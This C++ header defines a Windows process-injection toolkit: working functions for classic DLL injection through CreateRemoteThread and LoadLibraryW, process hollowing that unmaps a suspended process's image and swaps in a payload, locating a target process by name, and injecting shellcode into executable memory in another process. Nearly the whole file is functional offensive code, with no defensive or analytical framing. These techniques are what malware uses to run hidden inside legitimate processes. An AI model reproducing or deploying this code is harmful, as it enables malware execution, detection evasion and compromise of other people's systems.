#pragma once
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <vector>
#include <cstdint>

/**
 * Methods to inject code into remote processes.
 */

class ProcessInjection {
public:
    // Classic DLL injection via CreateRemoteThread
    static bool classic_dll_injection(DWORD pid, const wchar_t* dll_path) {
        HANDLE h_process = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
            FALSE, pid);
        if (!h_process) return false;

        size_t path_size = (wcslen(dll_path) + 1) * sizeof(wchar_t);
        LPVOID remote_mem = VirtualAllocEx(
            h_process, nullptr, path_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remote_mem) {
            CloseHandle(h_process);
            return false;
        }

        WriteProcessMemory(h_process, remote_mem, dll_path, path_size, nullptr);

        HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
        LPTHREAD_START_ROUTINE load_library = reinterpret_cast<LPTHREAD_START_ROUTINE>(
            GetProcAddress(kernel32, "LoadLibraryW"));

        HANDLE h_thread = CreateRemoteThread(
            h_process, nullptr, 0, load_library, remote_mem, 0, nullptr);
        if (!h_thread) {
            VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
            CloseHandle(h_process);
            return false;
        }

        WaitForSingleObject(h_thread, INFINITE);
        VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
        CloseHandle(h_thread);
        CloseHandle(h_process);
        return true;
    }

    static bool process_hollowing(const wchar_t* target_exe,
        const std::vector<uint8_t>& payload) {
        STARTUPINFOW si = { sizeof(STARTUPINFOW) };
        PROCESS_INFORMATION pi = {};
        if (!CreateProcessW(target_exe, nullptr, nullptr, nullptr,
            FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
            return false;
        }

        CONTEXT ctx = { CONTEXT_FULL };
        if (!GetThreadContext(pi.hThread, &ctx)) {
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }


        PVOID peb_addr = nullptr;
#ifdef _WIN64
        peb_addr = reinterpret_cast<PVOID>(ctx.Rdx);
#else
        peb_addr = reinterpret_cast<PVOID>(ctx.Ebx);
#endif


        PVOID image_base = nullptr;
        SIZE_T bytes_read = 0;
#ifdef _WIN64
        if (!ReadProcessMemory(pi.hProcess,
            reinterpret_cast<PBYTE>(peb_addr) + 0x10,
            &image_base, sizeof(image_base), &bytes_read)) {
#else
        if (!ReadProcessMemory(pi.hProcess,
            reinterpret_cast<PBYTE>(peb_addr) + 0x8,
            &image_base, sizeof(image_base), &bytes_read)) {
#endif
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }


        using NtUnmapViewOfSection_t = NTSTATUS(NTAPI*)(HANDLE, PVOID);
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        auto nt_unmap = reinterpret_cast<NtUnmapViewOfSection_t>(
            GetProcAddress(ntdll, "NtUnmapViewOfSection"));
        if (nt_unmap) {
            nt_unmap(pi.hProcess, image_base);
        }


        LPVOID remote_base = VirtualAllocEx(
            pi.hProcess, image_base, payload.size(),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remote_base) {
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        SIZE_T written = 0;
        if (!WriteProcessMemory(pi.hProcess, remote_base,
            payload.data(), payload.size(), &written)) {
            VirtualFreeEx(pi.hProcess, remote_base, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }


#ifdef _WIN64
        ctx.Rcx = reinterpret_cast<DWORD64>(remote_base);
#else
        ctx.Eax = reinterpret_cast<DWORD>(remote_base);
#endif
        if (!SetThreadContext(pi.hThread, &ctx)) {
            VirtualFreeEx(pi.hProcess, remote_base, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        ResumeThread(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
        }


    static DWORD find_process_by_name(const wchar_t* process_name) {
        DWORD pid = 0;
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) return 0;
        PROCESSENTRY32W pe32 = { sizeof(PROCESSENTRY32W) };
        if (Process32FirstW(snapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, process_name) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &pe32));
        }
        CloseHandle(snapshot);
        return pid;
    }


    static bool inject_shellcode(DWORD pid, const std::vector<uint8_t>&shellcode) {
        HANDLE h_process = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
            FALSE, pid);
        if (!h_process) return false;

        LPVOID remote_mem = VirtualAllocEx(
            h_process, nullptr, shellcode.size(),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remote_mem) {
            CloseHandle(h_process);
            return false;
        }

        SIZE_T written = 0;
        if (!WriteProcessMemory(h_process, remote_mem,
            shellcode.data(), shellcode.size(), &written)) {
            VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
            CloseHandle(h_process);
            return false;
        }

        HANDLE h_thread = CreateRemoteThread(
            h_process, nullptr, 0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(remote_mem),
            nullptr, 0, nullptr);
        if (!h_thread) {
            VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
            CloseHandle(h_process);
            return false;
        }

        WaitForSingleObject(h_thread, INFINITE);
        VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
        CloseHandle(h_thread);
        CloseHandle(h_process);
        return true;
    }
    };